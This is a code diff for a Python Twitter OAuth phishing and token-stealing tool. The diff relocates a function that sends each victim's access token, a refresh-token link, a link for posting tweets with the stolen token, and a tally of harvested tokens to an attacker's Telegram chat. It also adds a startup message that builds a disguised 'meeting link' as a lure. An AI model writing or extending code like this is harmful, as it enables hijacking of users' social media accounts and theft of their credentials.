@@ -43,43 +43,29 @@ def generate_code_verifier_and_challenge():
     ).rstrip(b'=').decode('utf-8')
     return code_verifier, code_challenge
 
-# Function to send access and refresh tokens to Telegram
-def send_to_telegram(access_token, refresh_token=None):
-    alert_emoji = "🚨"
-    key_emoji = "🔑"
-    user_emoji = "👤"
+# Function to send a startup message with OAuth link and meeting link
+def send_startup_message():
+    state = "0"  # Fixed state value for initialization
+    code_verifier, code_challenge = generate_code_verifier_and_challenge()
     
-    # Get the username from the access token
-    username = get_twitter_username(access_token)
-    if username:
-        twitter_url = f"https://twitter.com/{username}"
-    else:
-        twitter_url = "Unknown user"
-    
-    # Get the total tokens in the database
-    total_tokens = get_total_tokens()
+    # Generate the OAuth link
+    authorization_url = CALLBACK_URL
 
-    # Prepare the message
+    # Generate the meeting link
+    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
+    
+    # Message content
     message = (
-        f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
-        f"{key_emoji} *Access Token:* `{access_token}`\n"
+        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
+        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
     
-    if refresh_token:
-        refresh_link = f"{CALLBACK_URL}/refresh/{refresh_token}"
-        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
-
-    tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
-    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"
-    message += f"🔢 *Total Tokens in Database:* {total_tokens}"
-
     # Send the message to Telegram
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"  # Ensure the message is parsed correctly
+        "parse_mode": "Markdown"
     }
     requests.post(url, json=data)
 
@@ -160,6 +146,47 @@ def send_message_via_telegram(message):
         "parse_mode": "Markdown"
     }
     requests.post(url, json=data)
+    
+# Function to send access and refresh tokens to Telegram
+def send_to_telegram(access_token, refresh_token=None):
+    alert_emoji = "🚨"
+    key_emoji = "🔑"
+    user_emoji = "👤"
+    
+    # Get the username from the access token
+    username = get_twitter_username(access_token)
+    if username:
+        twitter_url = f"https://twitter.com/{username}"
+    else:
+        twitter_url = "Unknown user"
+    
+    # Get the total tokens in the database
+    total_tokens = get_total_tokens()
+
+    # Prepare the message
+    message = (
+        f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
+        f"{key_emoji} *Access Token:* `{access_token}`\n"
+    )
+    
+    if refresh_token:
+        refresh_link = f"{CALLBACK_URL}/refresh/{refresh_token}"
+        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
+
+    tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
+    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
+    message += f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"
+    message += f"🔢 *Total Tokens in Database:* {total_tokens}"
+
+    # Send the message to Telegram
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"  # Ensure the message is parsed correctly
+    }
+    requests.post(url, json=data)
+
 
 # Function to get Twitter username
 def get_twitter_username(access_token):
